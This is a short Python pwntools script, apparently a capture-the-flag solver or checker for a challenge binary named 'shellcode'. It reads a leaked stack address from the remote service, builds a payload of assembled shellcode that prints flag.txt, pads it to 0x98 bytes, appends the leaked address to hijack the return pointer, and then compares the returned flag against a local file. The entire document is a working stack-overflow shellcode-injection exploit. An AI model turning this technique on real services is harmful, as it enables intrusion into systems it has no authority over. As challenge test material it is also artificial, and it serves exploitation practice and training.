#!/usr/bin/env python3
from pwn import *
from time import sleep
import argparse
import sys

#### Setup
parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
args = parser.parse_args()

p = remote(args.host, args.port)

#### Exploit
context.binary = binary = './shellcode'
sc = asm(shellcraft.cat('flag.txt'))

p.recvuntil('Input =')
stack = int(p.recvline().split(b' ')[-1].strip().decode(), 16)
log.info(f'Input: {hex(stack)}')

payload = sc
payload += b'A'*(0x98 - len(sc))
payload += p64(stack)

p.sendline(payload)

#### Flag check
resp = p.recvuntil(b'}').strip()

flag = resp.split(b'\n')[-1].split(b' ')[-1].decode()
if flag in open('flag.txt').read():
    log.success(f'SUCCESS: {flag}')
    sys.exit(0)

log.critical('Failed!')
sys.exit(1)
